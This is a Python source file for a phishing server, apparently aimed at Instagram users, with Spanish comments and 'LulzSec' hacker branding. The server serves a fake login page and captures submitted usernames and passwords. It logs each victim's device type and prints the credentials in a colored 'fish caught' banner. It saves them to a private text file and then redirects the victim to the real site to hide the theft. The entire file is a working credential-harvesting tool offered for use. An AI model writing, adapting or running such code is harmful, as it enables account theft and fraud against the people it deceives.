import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import os

# --- COLORES HACKER ---
G = "\033[38;5;46m"  # Verde Matrix
R = "\033[38;5;196m" # Rojo Alerta
C = "\033[38;5;51m"  # Cian
Y = "\033[38;5;226m" # Amarillo
W = "\033[1;37m"     # Blanco Brillante
NC = "\033[0m"       # Reset

class AndyLulzSecServer(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args): return # Silenciar logs de fondo

    def do_GET(self):
        if self.path == '/':
            try:
                with open("index.html", "rb") as f:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_error(404, "index.html no encontrado")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # 1. Leer datos recibidos
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        datos = urllib.parse.parse_qs(post_data)
        
        usuario = datos.get('user_id', ['<VACIO>'])[0]
        password = datos.get('user_pass', ['<VACIO>'])[0]
        
        # 2. Detectar Sistema Operativo
        agent = self.headers.get('User-Agent', 'Desconocido')
        device = "PC/Web"
        if "Android" in agent: device = "Android"
        elif "iPhone" in agent: device = "iPhone/iOS"

        # 3. Lógica de Redirección Personalizada
        # Si el archivo redireccion.txt existe, lee la URL de ahí
        url_destino = "https://www.instagram.com" 
        if os.path.exists("redireccion.txt"):
            with open("redireccion.txt", "r") as f:
                url_destino = f.read().strip()

        fecha = datetime.now().strftime("%H:%M:%S")

        # --- REPORTE EN PANTALLA ---
        print(f"\n{R} [!] ALERTA: PEZ CAPTURADO EN LA RED [!]{NC}")
        print(f"{G}╔══════════════════════════════════════════════════╗{NC}")
        print(f"{G}║ {W}HORA     :{NC} {fecha}")
        print(f"{G}║ {W}SISTEMA  :{NC} {device}")
        print(f"{G}║ {W}USUARIO  :{NC} {Y}{usuario}{NC}")
        print(f"{G}║ {W}PASSWORD :{NC} {Y}{password}{NC}")
        print(f"{G}║ {W}REDIRECT :{NC} {C}{url_destino}{NC}")
        print(f"{G}╚══════════════════════════════════════════════════╝{NC}")

        # Guardar en log
        with open("registro_privado.txt", "a") as f:
            f.write(f"[{fecha}] Dev: {device} | User: {usuario} | Pass: {password} | Target: {url_destino}\n")

        # Redirigir al usuario
        self.send_response(301)
        self.send_header('Location', url_destino)
        self.end_headers()

def iniciar():
    os.system('clear')
    # --- LOGO LULZSEC EN ASCII ---
    print(f"""{W}
                .---.
               /     \\
              | () () |   {G}ANDY TECHNOLOGY{W}
               \\  ^  /    {C}LulzSec Edition{W}
                |||||
           记录 .---. 记录
          /  /     \\  \\
         |  |       |  |
         \\  \\       /  /
          \\  '---'  /
           '-------'
    {G}  Lulz Security - Laughing at your security
    {NC}{G}------------------------------------------
    {Y}[*]{NC} ESTADO   : {G}SISTEMA ACTIVO{NC}
    {Y}[*]{NC} REDIRECT : {C}Ver redireccion.txt{NC}
    {Y}[*]{NC} PUERTO   : {W}8080{NC}
    {G}------------------------------------------{NC}
    """)
    
    try:
        HTTPServer(('0.0.0.0', 8080), AndyLulzSecServer).serve_forever()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Saliendo de las sombras...{NC}")

if __name__ == "__main__":
    iniciar()
